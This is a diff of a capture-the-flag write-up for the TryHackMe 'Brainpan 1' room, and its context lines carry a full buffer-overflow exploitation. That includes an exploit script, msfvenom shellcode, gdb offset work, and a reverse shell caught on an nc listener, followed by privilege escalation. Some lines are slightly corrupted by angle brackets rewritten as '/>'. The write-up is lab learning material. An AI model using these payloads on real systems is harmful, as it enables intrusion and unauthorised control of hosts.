@@ -4,7 +4,7 @@ title: "Brainpan 1"
 
 :::info Description
 
-These are my notes for the [Brainpan 1 Room](https://tryhackme.com/room/brainpan) on TryHackMe. 
+These are my notes for the [Brainpan 1 Room](https://tryhackme.com/room/brainpan) on TryHackMe.
 
 Credits: S/o to SnoOw, Hunterbot, Tedd and Kafka's help on this box!
 
@@ -26,41 +26,41 @@ Using dievus' [threader3000](https://github.com/dievus/threader3000) multi-threa
 
 ```bash
 ------------------------------------------------------------   [31/31]
-        Threader 3000 - Multi-threaded Port Scanner                                                                 
-                       Version 1.0.7                                                                                
-                   A project by The Mayor                                                                           
-------------------------------------------------------------                                                        
-Enter your target IP address or URL here: 10.10.5.188                                                               
-------------------------------------------------------------                                                        
-Scanning target 10.10.5.188                                                                                         
-Time started: 2022-03-08 20:49:07.183965                                                                            
-------------------------------------------------------------                                                        
-Port 9999 is open                                                                                                   
-Port 10000 is open                                                                                                  
-Port scan completed in 0:01:32.890425                                                                               
-------------------------------------------------------------                                                        
-Threader3000 recommends the following Nmap scan:                                                                    
-************************************************************                                                        
-nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188                                                       
-************************************************************                                                        
-Would you like to run Nmap or quit to terminal?                                                                     
-------------------------------------------------------------                                                        
-1 = Run suggested Nmap scan                                                                                         
-2 = Run another Threader3000 scan                                                                                   
-3 = Exit to terminal                                                                                                
-------------------------------------------------------------                                                        
-Option Selection: 1                                                                                                 
-nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188                                                       
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 20:51 NZDT                                                    
-Nmap scan report for 10.10.5.188                                                                                    
-Host is up (0.28s latency).                                                                                         
-                                                                                                                    
+        Threader 3000 - Multi-threaded Port Scanner
+                       Version 1.0.7
+                   A project by The Mayor
+------------------------------------------------------------
+Enter your target IP address or URL here: 10.10.5.188
+------------------------------------------------------------
+Scanning target 10.10.5.188
+Time started: 2022-03-08 20:49:07.183965
+------------------------------------------------------------
+Port 9999 is open
+Port 10000 is open
+Port scan completed in 0:01:32.890425
+------------------------------------------------------------
+Threader3000 recommends the following Nmap scan:
+************************************************************
+nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188
+************************************************************
+Would you like to run Nmap or quit to terminal?
+------------------------------------------------------------
+1 = Run suggested Nmap scan
+2 = Run another Threader3000 scan
+3 = Exit to terminal
+------------------------------------------------------------
+Option Selection: 1
+nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 20:51 NZDT
+Nmap scan report for 10.10.5.188
+Host is up (0.28s latency).
+
 PORT      STATE SERVICE VERSION
 9999/tcp  open  abyss?
-| fingerprint-strings: 
-|   NULL: 
-|     _| _| 
-|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+| fingerprint-strings:
+|   NULL:
+|     _| _|
+|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
 |     _|_| _| _| _| _| _| _| _| _| _| _| _|
 |     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
 |     [________________________ WELCOME TO BRAINPAN _________________________]
@@ -112,10 +112,10 @@ We can see the following open ports:
 ```bash
 PORT      STATE SERVICE VERSION
 9999/tcp  open  abyss?
-| fingerprint-strings: 
-|   NULL: 
-|     _| _| 
-|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+| fingerprint-strings:
+|   NULL:
+|     _| _|
+|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
 |     _|_| _| _| _| _| _| _| _| _| _| _| _|
 |     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
 |     [________________________ WELCOME TO BRAINPAN _________________________]
@@ -165,7 +165,7 @@ import socket
 ip = "172.16.2.125"
 port = 9999
 
-offset = 0 
+offset = 0
 overflow = "A" * offset
 retn = ""
 padding = ""
@@ -283,7 +283,7 @@ except:
   print("Could not connect.")
 ```
 
-When the application crashes, use mona to compare the generated saved byte array with the value of the bytearray starting from the $ESP address (`-a <ESP-value>`):
+When the application crashes, use mona to compare the generated saved byte array with the value of the bytearray starting from the $ESP address (`-a <ESP-value />`):
 
 `!mona compare -f C:\Users\IEUser\Downloads\chatserver\bytearray.bin -a 0022F930`
 
@@ -373,7 +373,7 @@ Success:
 listening on [any] 80 ...
 connect to [10.11.55.83] from (UNKNOWN) [10.10.73.41] 42786
 /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
-puck@brainpan:/home/puck$ 
+puck@brainpan:/home/puck$
 ```
 
 :::info upgrade your shell
@@ -443,10 +443,10 @@ I copied the binary to shared web folder `/bin/cp validate /home/puck/web/bin` s
 When I run it, it does the following:
 
 ```bash
-└─$ ./validate     
-usage ./validate <input>
+└─$ ./validate
+usage ./validate <input />
 
-└─$ ./validate 12345 
+└─$ ./validate 12345
 validating input...passed.
 ```
 
@@ -455,29 +455,29 @@ Looks like a possible buffer overflow situation.
 Also, when I run strings on the binary, a few key words stand out:
 
 ```bash
-strings validate                                                                                                
-/lib/ld-linux.so.2                                                                                                  
-__gmon_start__                                                                                                      
-libc.so.6                                                                                                           
-_IO_stdin_used                                                                                                      
+strings validate
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
 strcpy # <-- we know this is vulnerable to overflow
-validate                                                                                                            
-main                                                                                                                
-validate.c                                                                                                          
-long long int                                                                                                       
-unsigned char                                                                                                       
-main                                                                                                                
-/root/bin/brainpan # <-- running a binary as root?                                                                 
+validate
+main
+validate.c
+long long int
+unsigned char
+main
+/root/bin/brainpan # <-- running a binary as root?
 long long unsigned int
 ```
 
 check some other info about the file:
 
 ```bash
-$ file validate  
+$ file validate
 validate: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.15, BuildID[sha1]=c4b7d3019dda6ebc259c4e4b63a336e00a63b949, with debug_info, not stripped
 
-$ binwalk validate 
+$ binwalk validate
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -492,7 +492,7 @@ Open the binary up in gdb:
 $ gdb ./validate
 GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
 Copyright (C) 2021 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html />
 This is free software: you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.
 Type "show copying" and "show warranty" for details.
@@ -506,7 +506,7 @@ Find the GDB manual and other documentation resources online at:
 For help, type "help".
 Type "apropos word" to search for commands related to "word"...
 Reading symbols from ./validate...
-(gdb) 
+(gdb)
 ```
 
 #### validate offset
@@ -515,7 +515,7 @@ Let's find the offset, create the pattern first:
 
 ```bash
 ┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
-└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 120             
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 120
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
 ```
 
@@ -598,9 +598,9 @@ gs             0x63                99
 (gdb) x/s $esp
 0xffffcf80:     ""
 (gdb) x/s $eip
-0x42424242:     <error: Cannot access memory at address 0x42424242>
+0x42424242:     <error: Cannot access memory at address 0x42424242 />
 (gdb) x/s $eax
-0xffffcf08:     'A' <repeats 116 times>, "BBBB"
+0xffffcf08:     'A' <repeats 116 times />, "BBBB"
 ```
 
 note: `$esp` is pointing at nothing and `$eax` is pointing to our shellcode place-holders (i.e. the A's), so we use `$eax` to jump to our shellcode.
@@ -625,8 +625,8 @@ Let's see if there's a `jmp` instruction in the binary that can get us to the `e
  80483e7:       e9 90 ff ff ff          jmp    804837c <.plt>
  80483ec:       ff 25 18 a0 04 08       jmp    *0x804a018
  80483f7:       e9 80 ff ff ff          jmp    804837c <.plt>
- 80484cc:       eb 3a                   jmp    8048508 <validate+0x54>
- 8048562:       eb 39                   jmp    804859d <main+0x65>
+ 80484cc:       eb 3a                   jmp    8048508 <validate+0x54 />
+ 8048562:       eb 39                   jmp    804859d <main+0x65 />
 ```
 
 no `jmp` instructions. what about a `call` instruction?
@@ -636,19 +636,19 @@ no `jmp` instructions. what about a `call` instruction?
 └─$ objdump -d validate| grep -i call
  8048353:       e8 00 00 00 00          call   8048358 <_init+0xc>
  8048369:       e8 1e 00 00 00          call   804838c <__gmon_start__@plt>
- 804836e:       e8 1d 01 00 00          call   8048490 <frame_dummy>
+ 804836e:       e8 1d 01 00 00          call   8048490 <frame_dummy />
  8048373:       e8 98 02 00 00          call   8048610 <__do_global_ctors_aux>
  804841c:       e8 7b ff ff ff          call   804839c <__libc_start_main@plt>
  8048468:       ff 14 85 14 9f 04 08    call   *0x8049f14(,%eax,4)
  80484af:       ff d0                   call   *%eax         # <--- here's one!
- 80484f3:       e8 d4 fe ff ff          call   80483cc <printf@plt>
- 80484ff:       e8 e8 fe ff ff          call   80483ec <exit@plt>
- 8048511:       e8 96 fe ff ff          call   80483ac <strlen@plt>
- 8048527:       e8 90 fe ff ff          call   80483bc <strcpy@plt>
- 8048558:       e8 6f fe ff ff          call   80483cc <printf@plt>
- 804856c:       e8 5b fe ff ff          call   80483cc <printf@plt>
- 804857c:       e8 33 ff ff ff          call   80484b4 <validate>
- 8048593:       e8 44 fe ff ff          call   80483dc <puts@plt>
+ 80484f3:       e8 d4 fe ff ff          call   80483cc <printf@plt />
+ 80484ff:       e8 e8 fe ff ff          call   80483ec <exit@plt />
+ 8048511:       e8 96 fe ff ff          call   80483ac <strlen@plt />
+ 8048527:       e8 90 fe ff ff          call   80483bc <strcpy@plt />
+ 8048558:       e8 6f fe ff ff          call   80483cc <printf@plt />
+ 804856c:       e8 5b fe ff ff          call   80483cc <printf@plt />
+ 804857c:       e8 33 ff ff ff          call   80484b4 <validate />
+ 8048593:       e8 44 fe ff ff          call   80483dc <puts@plt />
  80485b6:       e8 4f 00 00 00          call   804860a <__i686.get_pc_thunk.bx>
  80485c4:       e8 83 fd ff ff          call   804834c <_init>
  80485f4:       ff 94 b3 18 ff ff ff    call   *-0xe8(%ebx,%esi,4)
@@ -677,7 +677,7 @@ x86/shikata_ga_nai succeeded with size 70 (iteration=0)
 x86/shikata_ga_nai chosen with final size 70
 Payload size: 70 bytes
 Final size of c file: 319 bytes
-unsigned char buf[] = 
+unsigned char buf[] =
 "\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
 "\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef"
 "\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2"
@@ -688,8 +688,8 @@ unsigned char buf[] =
 check shellcode size with python:
 
 ```bash
-└─$ python3                                                                     
-Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
+└─$ python3
+Python 3.9.10 (main, Feb 22 2022, 13:54:07)
 [GCC 11.2.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 >>> shell = (
@@ -715,14 +715,14 @@ our payload in full:
 ```bash
 (gdb) run $(python -c "print ('\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\x31\x68\x15\x83\xe8\xf
 c\x03\x68\x11\xe2\xd9\x24\x74\xef\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2\xa5\x26\x68\x94\xc9\xea\
-x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")                             
-The program being debugged has been started already.                                                                  
-Start it from the beginning? (y or n) y                                                                               
+x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
 Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print ('\xbd\x2
 c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef\xb8\
 xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2\xa5\x26\x68\x94\xc9\xea\x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33\xf
-1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")                                        
-validating input...passed.                                                                                            
+1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")
+validating input...passed.
 [Inferior 1 (process 114848) exited normally]
 ```
 
@@ -748,7 +748,7 @@ x86/shikata_ga_nai succeeded with size 70 (iteration=0)
 x86/shikata_ga_nai chosen with final size 70
 Payload size: 70 bytes
 Final size of c file: 319 bytes
-unsigned char buf[] = 
+unsigned char buf[] =
 "\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
 "\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7"
 "\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd"
@@ -760,7 +760,7 @@ check shellcode size again with python3:
 
 ```bash
 └─$ python3
-Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
+Python 3.9.10 (main, Feb 22 2022, 13:54:07)
 [GCC 11.2.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 >>> shell = (
@@ -772,7 +772,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 ... )
 >>> print(len(shell))
 70
->>> 
+>>>
 ```
 
 ```bash
@@ -795,8 +795,8 @@ And now take our payload to the TryHackMe box:
 ```bash
 # listener running, and then fire the ./thm-linux.py script from before
 
-└─$ sudo rlwrap nc -lnvp 80              
-[sudo] password for kali: 
+└─$ sudo rlwrap nc -lnvp 80
+[sudo] password for kali:
 listening on [any] 80 ...
 connect to [10.11.55.83] from (UNKNOWN) [10.10.180.131] 38600
 whoami
@@ -808,11 +808,11 @@ ls
 ls
 validate
 ./validate $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
-<e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")      
+<e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
 whoami
 whoami
 anansi
-$ 
+$
 ```
 
 ![privesc validate](/img/brainpan1-validate.png)
